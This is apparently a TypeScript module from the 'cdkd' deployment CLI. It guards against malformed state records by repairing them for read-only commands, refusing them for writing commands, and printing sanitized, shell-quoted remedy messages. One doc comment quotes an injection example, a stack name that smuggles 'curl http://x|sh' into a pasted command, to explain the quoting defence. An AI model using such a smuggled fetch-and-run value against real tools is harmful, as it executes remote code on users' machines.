import { CdkdError } from '../utils/error-handler.js';
import { UNRENDERABLE, displaySafe, truncateCodePoints } from '../utils/display-safe.js';
import { shellQuote } from './lock-contention-message.js';
import { isReadableBag } from '../types/state.js';
import type { StackState } from '../types/state.js';

/** The error code every malformed-record refusal carries, whatever its class. */
export const STATE_RESOURCES_MALFORMED = 'STATE_RESOURCES_MALFORMED';

/**
 * Answer the ONE question both helpers below key on: can this record's
 * resource map be read at all?
 *
 * Widened past `null` / `undefined` because the message says "no readable
 * resources map" and a hand-edited record does not stop at those two: a
 * `[]`, a `5` or a `"ab"` all survive `Object.entries` and yield a bag that is
 * empty or, for the string, absurd — repaired silently and warned about
 * nowhere. The predicate is the plain-object test the bag's own type implies.
 */
export function hasReadableResources(state: StackState): boolean {
  return isReadableBag(state.resources);
}

/**
 * The same question for the `outputs` bag — and it is a SEPARATE predicate
 * rather than a second argument to the one above because the ABSENCE rule
 * differs, which is the split {@link isReadableBag}'s own note calls a
 * per-container call.
 *
 * An absent `outputs` bag is an ordinary record, not a defect: `cdkd scrub`
 * round-trips one deliberately rather than materializing `{}` over it, and the
 * deploy's failure-path saves write `outputs: currentState.outputs`, which
 * `JSON.stringify` drops when it is `undefined`. So `undefined` is EXEMPT here
 * while it is a defect for `resources`. `null` is NOT exempt — it is a value a
 * hand-edited record carries and every consumer either throws on it or
 * launders it into `{}`.
 *
 * Both {@link repairMalformedOutputsForReadOnly} and
 * {@link refuseMalformedOutputs} delegate to this, so the read-only and the
 * write-capable halves cannot come to different verdicts about the same record.
 */
export function hasReadableOutputs(state: Pick<StackState, 'outputs'>): boolean {
  return state.outputs === undefined || isReadableBag(state.outputs);
}

/**
 * The plain-object test itself, without the `resources` field bound to it.
 *
 * RE-EXPORTED, not defined here any more: it MOVED to `src/types/state.ts` with
 * go-to-k/cdkd#3192, whose own doc carries the full rationale and the reason for
 * the move (`importableOutputKeys` needs the predicate, and it sits in the layer
 * this module imports FROM). Every importer of this module is unchanged — the
 * same shape, and the same reason, as `DEFAULT_STATE_PREFIX` moving into
 * `src/state/state-prefix.ts`.
 *
 * Enumerate the consumers with `grep -rn "isReadableBag" src/` rather than from
 * a list here; four successive enumerations of them, written by reasoning, came
 * out incomplete.
 */
export { isReadableBag };

/**
 * The shared explanation, in the terms the reader needs: what is wrong, what
 * to look at, and what NOT to do next.
 *
 * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
 * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
 * `.claude/rules/layout-state-types.md` require of any suggestion a user is
 * meant to paste, for two separate reasons.
 *
 * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
 * printable-ASCII allowlist, so it removes the line- and escape-forgery class
 * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
 * trusted here, since a stack name reaches the cross-stack read path from an
 * `Fn::GetStackOutput` argument or an S3 key. A name spelled
 * `a'; curl http://x|sh; echo '` would close the quoting and append its own
 * command to the line this text tells the user to RUN.
 *
 * Wrapping the command in `'...'` is not enough either, and is what makes the
 * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
 * produces something unpastable. Hence unwrapped and last.
 *
 * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
 * nothing — an empty argument makes `--stack-region` swallow the next flag,
 * turning a remedy into a differently-broken command.
 *
 * EXPORTED since go-to-k/cdkd#3206's review: `cdkd scrub`'s audited-record
 * refusal builds its own name list, and a half-reimplementation there
 * sanitized without CAPPING — so one run rendered the same stack name capped
 * in the per-record warning and unbounded in the refusal. Nested children are
 * `Parent~Child` recursively, so an uncapped name really can push the rest of
 * the sentence off the reader's screen. Call this rather than spelling the
 * `displaySafe` + `truncateCodePoints` pair again.
 */
export function safeIdentifier(value: string): string {
  // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
  // planted multi-kilobyte one would push the trailing remedy command off the
  // reader's screen -- the message would be technically correct and useless.
  // `truncateCodePoints` rather than `slice`, so the cut never lands inside a
  // surrogate pair; `displaySafe` rather than `displayIdent`, because the
  // latter JSON-quotes and that would compose badly with `shellQuote` below.
  const safe = displaySafe(value, { asciiOnly: true });
  if (!safe) return UNRENDERABLE;
  const { text, truncated } = truncateCodePoints(safe, 128);
  return truncated ? `${text}...` : text;
}

function malformedStateDetail(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'resources' map — the ` +
    `record is malformed or truncated. Do NOT run 'cdkd deploy' or 'cdkd destroy' against it: ` +
    `both read the same map, and an unreadable one is indistinguishable from an empty stack, ` +
    `so deploy would re-CREATE every resource and destroy would delete none of them. Inspect ` +
    `it with: cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a READ-ONLY command: give the record an empty resource bag so the
 * command can report on it, and say so (issue go-to-k/cdkd#3018).
 *
 * `parseStateBody` deliberately does not validate the inner shape, so a
 * hand-edited or truncated record reaches a command with `resources` absent,
 * `null`, or some other non-object. Every such command then died on a raw
 * `TypeError` from the first `Object.keys` / `in` / index read — the exact
 * wording differs per shape (`Cannot convert undefined or null to object`,
 * `Cannot use 'in' operator`, `Cannot read properties of null`), and none of
 * them names a stack, a key or a remedy, from exactly the commands a user
 * reaches for WHEN the state is broken.
 *
 * WHY AT THE LOAD AND NOT AT EACH LOOP. The first cut of #3018 put `?? {}` on
 * the twelve `Object.entries(state.resources)` loops, which was inert: every
 * one of those flows dereferences the bag EARLIER — `!(id in state.resources)`,
 * `hasOwnProperty.call(...)`, `state.resources[logicalId]` — so the abort still
 * happened one line up and the guards only made it look handled. One call per
 * load dominates the whole flow behind it, including the helpers that take the
 * state as a parameter (`orphan-rewriter`, `diff-calculator`,
 * `collectCcApiRoutes`).
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true`. A silent repair is its own defect — an empty resource set is
 * indistinguishable from a healthy empty stack in every later line of output,
 * so `No changes detected` over an unreadable record is a clean verdict about
 * nothing.
 *
 * **Only for a command that cannot WRITE state.** Anything that can persist
 * uses {@link refuseMalformedState} instead; see its note.
 */
export function repairMalformedResourcesForReadOnly(state: StackState): boolean {
  if (hasReadableResources(state)) return false;
  state.resources = {};
  return true;
}

/**
 * The refusal TEXT, for a command whose own exit-code contract means this
 * cannot be a plain `CdkdError`.
 *
 * `cdkd scrub` is the case: its exit `1` is SPOKEN FOR ("--fail found
 * plaintext") and every one of its refusals carries `exitCode = 2`, because a
 * CI gate reading the code alone must be able to tell "scrub looked and found
 * a leak" from "scrub refused to look" — the two call for opposite responses.
 * So scrub tests {@link hasReadableResources} and raises its own class around
 * this text rather than calling {@link refuseMalformedState}.
 *
 * The other three refusing commands do NOT share that need, and giving them a
 * single shared code would be wrong in the other direction: `cdkd rollback`
 * documents `2` as "PARTIAL — journal kept, idempotent re-run", so a `2` here
 * would tell an operator to re-run a command that attempted nothing.
 */
export function malformedStateRefusalMessage(stackName: string, region: string): string {
  return (
    `${malformedStateDetail(stackName, region)} This command can WRITE state, so it refuses ` +
    `rather than continuing: saving over a record whose resource map could not be read would ` +
    `replace the evidence with a well-formed empty one and lose it permanently. Repair or ` +
    `remove the record first.`
  );
}

/**
 * A record container a TEXT view walks with `Object.entries`, other than the
 * `resources` bag the rest of this module is about.
 *
 * A CLOSED union because a container name is the VIEW's own vocabulary — the
 * set of blocks it renders — not anything a record can name. Widening it to
 * `string` would let a caller hand the warning below a key read out of a
 * hand-edited record, which is a different message from the one this is.
 *
 * That is a design reason and NOT a safety one, and the distinction is
 * load-bearing: {@link malformedRenderedContainersWarning} sanitizes every name
 * it prints, so the closed union is not what stops a forged one from forging a
 * line. Do not read this note as licence to drop that sanitizing — an earlier
 * revision of this comment said the opposite and would have licensed exactly
 * that (review of go-to-k/cdkd#3190).
 */
export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes' | 'properties';

/**
 * The warning a view emits when it emptied one or more {@link
 * RenderedStateContainer}s it could not walk (go-to-k/cdkd#3187).
 *
 * Deliberately NOT {@link malformedResourcesWarning}'s text, and the reason is
 * narrower than it looks. That one tells the reader not to run `cdkd deploy` /
 * `cdkd destroy` because an unreadable `resources` MAP is indistinguishable
 * from an empty stack: deploy would re-CREATE everything and destroy would
 * delete nothing. No container named here can produce that specific confusion —
 * the resource SET is still readable — so borrowing that sentence would attach
 * a re-create-the-world warning to a record whose resource list is intact.
 *
 * It is NOT that these containers are display-only. `properties` is read by the
 * deploy change calculation (`src/analyzer/diff-calculator.ts`), which imports
 * nothing from this module, and a non-object there compares unequal to any
 * desired object and yields a spurious property-change set — filed as
 * go-to-k/cdkd#3191. An earlier revision of this comment asserted the
 * display-only premise, which would have read as licence to drop a guard on
 * that path (review of go-to-k/cdkd#3190).
 *
 * What stays the same is the remedy: `--json` is the mode that shows the
 * stored value.
 *
 * ONE warning per record however many containers it names — a stack whose 500
 * resources all carry a hand-edited `properties` gets one line, not 500. The
 * caller FILTERS a fixed order (`RENDERED_CONTAINER_ORDER`), so the text is
 * stable across records. Not `.sort()` — that order is deliberately not
 * alphabetical, and its own JSDoc says so.
 *
 * Both identifiers are sanitized and then shell-quoted, and the command is
 * emitted LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s own note
 * gives.
 *
 * The container NAMES take {@link safeIdentifier} too — the SAME helper, so
 * they cannot drift from it — but NOT `shellQuote`, because they appear in the
 * PROSE and never inside the command this text tells the reader to run; the
 * command carries the two identifiers and nothing else.
 *
 * Sanitizing them is not dead code written for a case that cannot happen. The
 * union above is closed at COMPILE time, so without this the guarantee would
 * live in a comment, and the day a caller derives a name from a record instead
 * of from a literal an unsanitized element could forge a line, render as empty
 * quotes naming nothing, or run to kilobytes and push the remedy command off
 * the reader's screen. `safeIdentifier` closes all three and is the identity on
 * all four literals, so no user-visible text moves.
 *
 * What it does NOT close, stated rather than reassured away: a forged name made
 * only of printable ASCII still renders verbatim inside its quotes and could
 * read as prose. That residual is bounded to the PROSE — the command the reader
 * pastes is built from the two shell-quoted identifiers alone — and closing it
 * would mean JSON-quoting a name in the one place the text is meant to read as
 * English (review of go-to-k/cdkd#3190).
 */
export function malformedRenderedContainersWarning(
  stackName: string,
  region: string,
  containers: readonly RenderedStateContainer[]
): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  const names = containers.map((name) => `'${safeIdentifier(name)}'`).join(', ');
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has a non-object ${names} — the record ` +
    `is malformed or truncated. 'Object.entries' walks a string or a list as readily as a map, ` +
    `so rendering one INVENTS a row per character or element. Continuing with it EMPTY: this ` +
    `view shows no rows there, which is not the same as the record holding none. A per-resource ` +
    `container is named once however many resources hold one. See the stored values with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/** The warning a caller of {@link repairMalformedResourcesForReadOnly} emits. */
export function malformedResourcesWarning(stackName: string, region: string): string {
  return `${malformedStateDetail(stackName, region)} Continuing with an EMPTY resource set: this command's output describes zero resources, which is not the same as the stack having none.`;
}

/**
 * The `outputs` half of {@link repairMalformedResourcesForReadOnly}, for a
 * READ-ONLY command that DIFFS the stored bag rather than rendering it
 * (go-to-k/cdkd#3189).
 *
 * `computeOutputsDiff` enumerates the stored bag twice, the second walk
 * emitting one `REMOVE` row per stored key today's template no longer declares.
 * It used to admit the bag on a bare `?? {}`, which covers `null` and
 * `undefined` only — so a hand-edited or truncated record whose `outputs` holds
 * a string or a list previewed the REMOVAL of outputs that never existed, one
 * row per character or element, each carrying a character of the record as its
 * `old:` side, with `cdkd diff --fail` exiting 1 on them.
 *
 * AT THE LOAD, for the reason
 * {@link repairMalformedResourcesForReadOnly}'s own note records and one more
 * that is specific to this container: `cdkd diff` dereferences the stored bag
 * BEFORE the walk that fabricates. `resolveTemplateOutputs` asks
 * `hasOwnProperty.call(storedOutputs, key)` for go-to-k/cdkd#2740's
 * skipped-output record and for go-to-k/cdkd#1942's literal `Export.Name`
 * verdict — which ANSWERS TRUE on a string for `'0'` or `'length'`, and THROWS
 * outright on `null` (`Cannot convert undefined or null to object`). So a guard
 * written at `computeOutputsDiff` alone leaves a wrong decision, or a raw
 * `TypeError`, one call above it.
 *
 * ABSENT IS EXEMPT AND `null` IS NOT, which is the one place this diverges from
 * {@link isReadableBag}'s verdict, and the split is measured rather than
 * stylistic. Both stored-bag lookups named above gate on
 * `storedOutputs !== undefined` before the `hasOwnProperty` call, so an ABSENT
 * bag never reaches one; every other consumer on the diff path carries its own
 * `?? {}` (`mergeNoChangeOutputs`'s `persisted`, `importableOutputKeys`, this
 * function's own walk). An absent bag is therefore inert, exactly the condition
 * under which `state.ts`'s `repairRenderedContainers` exempts it — and warning
 * would be a false positive on a record cdkd itself supports: `cdkd scrub`
 * round-trips a record with no `outputs` deliberately, refusing to materialize
 * `{}` over it, and the deploy's failure-path saves write
 * `outputs: currentState.outputs`, which `JSON.stringify` drops when it is
 * undefined. A `null` bag is NOT inert — it passes the `!== undefined` gate and
 * `hasOwnProperty.call(null, ...)` throws — so it is repaired and warned about
 * like any other unreadable shape.
 *
 * That leaves one clause of go-to-k/cdkd#3189's stated floor overridden on
 * purpose: it asked that a `null` bag "diff exactly as it does today and say
 * nothing", and diffing exactly as it does today means THROWING. Recorded on
 * the issue rather than silently traded.
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true` with {@link malformedOutputsWarning}. Read-only commands ONLY, for
 * the reason {@link refuseMalformedState} gives — a bag laundered into a
 * well-formed empty one is permanent, and for `outputs` it would also take the
 * exports index with it on the next write.
 */
export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  if (hasReadableOutputs(state)) return false;
  state.outputs = {};
  return true;
}

/**
 * The warning a caller of {@link repairMalformedOutputsForReadOnly} emits.
 *
 * Deliberately neither {@link malformedResourcesWarning}'s text nor
 * {@link malformedRenderedContainersWarning}'s, because the CONSEQUENCE of
 * continuing empty differs from both. The resources text forbids
 * `cdkd deploy` / `cdkd destroy` because an unreadable resource MAP is
 * indistinguishable from an empty stack; the resource set is intact here. The
 * rendered-containers text says the view "shows no rows there" — true of a
 * renderer, false of a diff, which does not go quiet on an empty stored bag but
 * reports every resolved output as an `ADD`. Saying so is the point: an
 * operator who reads `ADD` rows for outputs the stack already has needs to know
 * the comparison lost its left-hand side.
 *
 * Identifiers are sanitized and then shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. Where the stored value is a string or a list, ` +
    `'Object.entries' walks it as readily as a map, so diffing it INVENTS a REMOVE row per ` +
    `character or element carrying the record's own characters; where it is a number, a boolean ` +
    `or null, it yields no comparison at all. Continuing with it EMPTY: every output this diff ` +
    `resolves is reported as an ADD and no stored key is reported as a REMOVE, which is not the ` +
    `same as the record holding none. See the stored value with: ` +
    `cdkd state show ${shellQuote(stack)} --stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a command that can WRITE state: refuse the record by name instead of
 * repairing it.
 *
 * Repairing is actively DANGEROUS here, and the PR that introduced this module
 * shipped that danger for one round before its security review caught it.
 * `cdkd scrub` gates its `saveState` on `recordsChanged > 0`, which an OUTPUTS
 * change alone satisfies — so a record holding `"resources": null` and a
 * plaintext secret in `outputs` would be scrubbed, and then saved back with a
 * repaired, WELL-FORMED `resources: {}`. The malformed record is the only
 * signal that anything is wrong; laundering it into a legitimate-looking empty
 * one is permanent and silent. The next `cdkd deploy` then reads zero resources
 * and CREATES the whole stack a second time, and the next `cdkd destroy`
 * deletes nothing and orphans every live resource — and the one-shot warning
 * that would have said so is long gone, quite possibly for a different
 * operator. `cdkd import --force` launders it the same way.
 *
 * Refusing still satisfies #3018, whose complaint was the BARE `TypeError`:
 * this names the stack, the region, the defect and the remedy, and exits on a
 * code rather than on a stack trace.
 */
export function refuseMalformedState(state: StackState, stackName: string, region: string): void {
  if (hasReadableResources(state)) return;
  throw new CdkdError(malformedStateRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED);
}

/**
 * The `outputs` half of {@link malformedStateRefusalMessage}, for the same
 * reason that one is exported separately from the throw: `cdkd scrub`'s exit
 * `1` is spoken for and it raises its own exit-2 class around this text.
 *
 * A DIFFERENT text from the `resources` refusal because the consequence of
 * continuing differs, the same way the three warnings in this module differ. The
 * `resources` message forbids `cdkd deploy` / `cdkd destroy` because an
 * unreadable resource MAP is indistinguishable from an empty stack; the resource
 * set is intact here. What is at stake instead is the SHARED exports index:
 * `cdkd/_index/<region>/exports.json` is rebuilt from these bags, and a string
 * bag published one fabricated export per character into the namespace every
 * other stack's `Fn::ImportValue` binds against.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedOutputsRefusalMessage(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map — the ` +
    `record is malformed or truncated. This command can WRITE state, so it refuses rather than ` +
    `continuing: it REBUILDS the bag before saving, and 'Object.entries' walks a string or a ` +
    `list as readily as a map, so a six-character value would be saved back as a well-formed ` +
    `six-key map (a null one as an empty map). That replaces the only signal anything is wrong ` +
    `with a legitimate-looking record, permanently — and the next deploy republishes it into ` +
    `the shared exports index every other stack's Fn::ImportValue resolves against. Repair or ` +
    `remove the record first. Inspect it with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * The line `ExportIndexStore`'s rebuild emits for a producer record whose
 * export set it could not read (issue go-to-k/cdkd#3192) — `outputs` not a
 * plain object, or `exportNames` present and not an array.
 *
 * A THIRD outputs text rather than {@link malformedOutputsWarning} because the
 * consequence is again different, which is the rule the two above already
 * follow. That one describes a DIFF continuing with an empty left-hand side.
 * This describes a record CONTRIBUTING NOTHING to a shared, region-wide index
 * other stacks resolve against — so the symptom a reader will actually meet is
 * a later `Fn::ImportValue` failing in a DIFFERENT stack, naming the consumer
 * and not this record. Saying which producer dropped out is the whole value of
 * the line.
 *
 * It says the rebuild CONTINUES, because it does: refusing would take every
 * other producer in the region down with it, and the index is best-effort by
 * design.
 *
 * Identifiers are sanitized and THEN shell-quoted and the command is emitted
 * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
 */
export function malformedExportSourceWarning(stackName: string, region: string): string {
  const stack = safeIdentifier(stackName);
  const reg = safeIdentifier(region);
  return (
    `State for ${shellQuote(stack)} (${shellQuote(reg)}) has no readable 'outputs' map or ` +
    `'exportNames' list — the record is malformed or truncated. It contributes NO exports to ` +
    `this region's index, which is not the same as the stack exporting none: an ` +
    `Fn::ImportValue of a name this stack really publishes will fail in the CONSUMER stack, ` +
    `naming that stack rather than this record. Continuing with the other producers — ` +
    `enumerating a string or a list here would instead publish one FABRICATED export per ` +
    `character or element. See the stored values with: cdkd state show ${shellQuote(stack)} ` +
    `--stack-region ${shellQuote(reg)} --json`
  );
}

/**
 * For a command that can WRITE state: refuse a record whose `outputs` bag
 * cannot be read, instead of rebuilding it (issue go-to-k/cdkd#3192).
 *
 * The SIBLING of {@link refuseMalformedState}, and deliberately a second call
 * rather than a widening of that one. A record can be malformed in either
 * container alone, the two carry different consequences, and the refusal a user
 * sees must name the container that is actually broken — a `resources` message
 * printed over an intact resource map tells them not to run `cdkd deploy` for a
 * reason that does not hold.
 *
 * Why REFUSE and not {@link repairMalformedOutputsForReadOnly}, which is the
 * opposite answer for the same container one function up: repairing the bag and
 * then saving it IS the laundering this is here to stop. Measured, not
 * reasoned — `rewriteResourceReferences` turns `outputs: 'abcdef'` into
 * `{"0":"a",…,"5":"f"}` and `cdkd orphan` saves that; `cdkd scrub`'s
 * `redactUnaccountedOutputs` spreads the same string into a map and its
 * `outputsChanged` compare then satisfies the `recordsChanged > 0` write gate;
 * `cdkd import` carries a `null` bag through `?? {}`. Each one rewrites a
 * damaged record into a well-formed one and the evidence is gone.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and above the first
 * expression that reads the bag — the placement rule
 * {@link repairMalformedResourcesForReadOnly}'s note records, for the reason it
 * records: a guard written at the rebuild leaves every earlier dereference in
 * front of it.
 */
export function refuseMalformedOutputs(
  state: Pick<StackState, 'outputs'>,
  stackName: string,
  region: string
): void {
  if (hasReadableOutputs(state)) return;
  throw new CdkdError(malformedOutputsRefusalMessage(stackName, region), STATE_RESOURCES_MALFORMED);
}
